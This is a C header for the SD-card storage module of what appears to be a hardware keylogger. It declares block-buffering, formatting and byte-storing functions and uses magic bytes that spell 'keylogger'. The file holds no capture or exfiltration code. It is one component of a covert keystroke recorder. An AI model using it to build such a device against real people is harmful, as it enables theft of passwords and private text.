//
// Created by Lorenz on 23/03/2022.
//

#ifndef KEYLOGGER_STORAGE_H
#define KEYLOGGER_STORAGE_H

#include <stdint.h>
#include <stdbool.h>
#include "../drivers/sd_spi.h"

#define STORAGE_BLOCK_SIZE  512
#define STORAGE_BLOCK1_MAGIC_BYTES_SIZE 9
#define STORAGE_BLOCK1_LAST_BLOCK_OFFSET 12
#define STORAGE_UNSAVED_BLOCK_BUFFER_SIZE   550 // Min 512. If the buffer size is bigger than 512 bytes, data can still be stored from interrupts when the buffer is written to the storage device

static const uint8_t magic_bytes[STORAGE_BLOCK1_MAGIC_BYTES_SIZE] = {0x6B, 0x65, 0x79, 0x6C, 0x6F, 0x67, 0x67, 0x65, 0x72};


typedef struct {
    sd_spi_t * sd_card;
    uint32_t last_used_block;
    uint8_t unsaved_block_buffer[STORAGE_UNSAVED_BLOCK_BUFFER_SIZE];
    uint16_t unsaved_block_buffer_index;
    uint32_t max_block_count;
    bool device_initialized;
} storage_t;

/**
 * Calculates the number of used blocks (512 bytes)
 *
 * @param storage
 * @return
 */
static inline uint32_t storage_get_used_blocks(storage_t *storage) {
    return (storage->last_used_block - 1);
}

/**
 * Getter for the device initialized var
 *
 * @param storage
 * @return
 */
static inline bool storage_get_device_initialized(storage_t *storage) {
    return storage->device_initialized;
}


// Function prototypes
void storage_init(storage_t *storage, sd_spi_t * sd_card);
void storage_device_init(storage_t *storage);
void storage_format(storage_t *storage);
static inline void storage_write_block(storage_t *storage, uint8_t * buffer, uint32_t block);
static inline void storage_read_block(storage_t *storage, uint8_t * buffer, uint32_t block);
static bool storage_verify_magic_bytes(const uint8_t *buffer);
static void storage_update_block_1(storage_t *storage);
static void storage_format_device(storage_t *storage);
bool storage_store_byte(storage_t *storage, uint8_t byte);
void storage_release(storage_t *storage);
void storage_task(storage_t *storage);

#endif //KEYLOGGER_STORAGE_H
